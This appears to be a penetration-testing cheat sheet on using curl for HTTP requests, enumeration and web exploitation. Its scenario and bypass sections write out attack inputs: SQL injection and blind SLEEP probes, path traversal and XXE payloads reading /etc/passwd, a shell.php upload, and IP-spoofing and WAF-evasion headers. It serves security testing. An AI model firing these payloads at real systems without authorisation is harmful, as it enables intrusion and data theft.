# Curl Web Requests

**Knowledge Score:** 90/100  
**Last Updated:** June 21, 2026

---

## QUICK COMMANDS

### Basic Requests
```bash
curl http://target.com                    # GET request
curl -X POST http://target.com            # POST request
curl -X PUT http://target.com             # PUT request
curl -X DELETE http://target.com          # DELETE request
curl -X HEAD http://target.com            # HEAD request (headers only)
```

### Headers & Authentication
```bash
curl -H "User-Agent: Mozilla/5.0" http://target
curl -H "Authorization: Bearer TOKEN" http://target
curl -H "Content-Type: application/json" http://target
curl -u username:password http://target
```

### POST Data
```bash
curl -X POST -d "param1=value1&param2=value2" http://target
curl -X POST -d '{"key":"value"}' -H "Content-Type: application/json" http://target
curl -X POST --data-urlencode "param=value" http://target
```

### File Operations
```bash
curl -F "file=@/path/to/file.txt" http://target           # File upload
curl -F "field=value" -F "file=@file.txt" http://target    # Mixed data + file
curl -o output.html http://target                          # Save response to file
curl -O http://target/file.exe                             # Save with original filename
```

### Response & Display
```bash
curl -I http://target              # Headers only (-i includes both)
curl -sS http://target             # Silent mode, show errors
curl -v http://target              # Verbose (request + response)
curl -L http://target              # Follow redirects
curl --trace output.txt http://target  # Full trace debugging
```

---

## ENUMERATION PAYLOADS

### Header Extraction
```bash
curl -I http://target:80
curl -I http://target:443
curl -I http://target:8080

# Check for:
# Server: Apache/2.4.1 (version leak)
# X-Powered-By: PHP/7.2.0 (tech stack)
# Set-Cookie: (session tracking)
```

### Security Header Audit
```bash
curl -sI http://target | grep -E "X-Frame-Options|X-Content-Type|HSTS|CSP"
# Missing headers = vulnerabilities
```

### Multi-Port Scanning
```bash
for port in 80 443 8080 8443 3000 5000; do
  echo "=== Port $port ==="
  curl -sI http://target:$port | head -1
done
```

### Extract Information Leaks
```bash
curl -s http://target | grep -E "version|copyright|author|powered"
```

### API Endpoint Discovery
```bash
curl http://target/api/
curl http://target/api/v1/
curl http://target/api/users
curl http://target/api/admin
```

---

## EXPLOITATION SCENARIOS

### Scenario 1: Identify Technology Stack
```bash
# Extract server info
curl -sI http://target | grep "Server:"
curl -sI http://target | grep "X-Powered-By:"
curl -sI http://target | grep "X-AspNet-Version:"

# Result: Know what software is running
```

### Scenario 2: Bypass Security Headers
```bash
# Test if origin matters
curl -H "Origin: http://attacker.com" http://target/api
curl -H "X-Forwarded-For: 127.0.0.1" http://target

# Check CORS, IP restrictions, etc.
```

### Scenario 3: Extract Sensitive Information via Headers
```bash
curl -sI http://target | grep -i "server\|x-\|etag\|date"
# Server leaks version numbers
# ETags can be used for cache busting
```

### Scenario 4: POST Data Injection
```bash
# SQL Injection in POST
curl -X POST -d "username=admin' OR '1'='1&password=test" http://target/login

# Command Injection
curl -X POST -d "file=../../etc/passwd" http://target/download

# XXEXML injection
curl -X POST -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' http://target/upload
```

### Scenario 5: Authentication Testing
```bash
# Test credentials
curl -u admin:password http://target/admin

# Test API tokens
curl -H "Authorization: Bearer eyJhbGc..." http://target/api/users

# Test session cookies
curl -b "session=ABC123" http://target/profile
```

---

## DETECTION & VERIFICATION

### Test for Open Redirect
```bash
curl -L -w "%{redirect_url}\n" http://target/redirect?url=http://attacker.com
```

### Verify SSL/TLS Configuration
```bash
curl -v https://target --tlsv1.2  # Try TLS 1.2
curl -v https://target --tlsv1.0  # Try TLS 1.0 (bad)
```

### Check Response Time (blind SQLi)
```bash
time curl "http://target/product?id=1' AND SLEEP(5) -- "
# If response takes 5+ seconds = vulnerable
```

### Verify File Upload
```bash
curl -F "file=@shell.php" http://target/upload
curl http://target/uploads/shell.php  # Check if executed
```

---

## BYPASS TECHNIQUES

### User-Agent Spoofing
```bash
curl -A "Mozilla/5.0" http://target
curl -A "sqlmap/1.0" http://target  # Trick WAF
```

### Header Injection
```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://target
curl -H "X-Real-IP: 10.0.0.1" http://target
curl -H "CF-Connecting-IP: 192.168.1.1" http://target
```

### Cookie Manipulation
```bash
curl -b "admin=true; role=admin" http://target
curl -b "session=AAABBBCCC" http://target
```

### Encoding Bypass
```bash
curl "http://target/page?id=1%27%20OR%20%271%27=%271"  # URL encoding
curl -d "payload=$(echo 'SELECT * FROM users' | base64)" http://target  # Base64
```

---

## BEST PRACTICES

- Always verify SSL: `curl -v https://target` (shows cert)
- Use `-H` for custom headers (case matters sometimes)
- Test `-L` for redirect chains
- Use `-X METHOD` to specify HTTP method
- Combine with `grep` for quick info extraction
- Save requests with `-o` for documentation
- Use `-v` to debug issues
- Test across different ports (80, 443, 8080, etc.)

---

## COMMON MISTAKES

❌ Not checking `-I` output before going deep
❌ Missing `-L` flag (redirects silently fail)
❌ Wrong `-X` method for endpoint
❌ Forgetting to URL-encode special characters
❌ Not using `-H` for required content types
❌ Assuming status 404 means no endpoint (check 403 auth)

---

## QUICK REFERENCE

| Flag | Purpose | Example |
|------|---------|---------|
| -X | HTTP method | curl -X POST |
| -H | Custom header | curl -H "Content-Type: application/json" |
| -d | POST data | curl -d "key=value" |
| -u | Basic auth | curl -u user:pass |
| -F | Form/file upload | curl -F "file=@file.txt" |
| -I | Headers only | curl -I |
| -L | Follow redirects | curl -L |
| -o | Save to file | curl -o output.html |
| -v | Verbose output | curl -v |

---

## RELATED CHEATSHEETS

- Nmap-Reconnaissance.md (network discovery)
- SQLi-Bash-Exploitation.md (SQL injection via curl)

---

## REFERENCES

- Curl Manual: https://curl.se/docs/manual.html
- HTTP Methods: https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods

---

## CHANGELOG

**v1.0 (2026-06-21)** - Initial creation from Scripts & Notes
- Quick command reference for HTTP operations
- Header extraction and security audits
- API discovery and authentication testing
- Bypass techniques and exploitation patterns
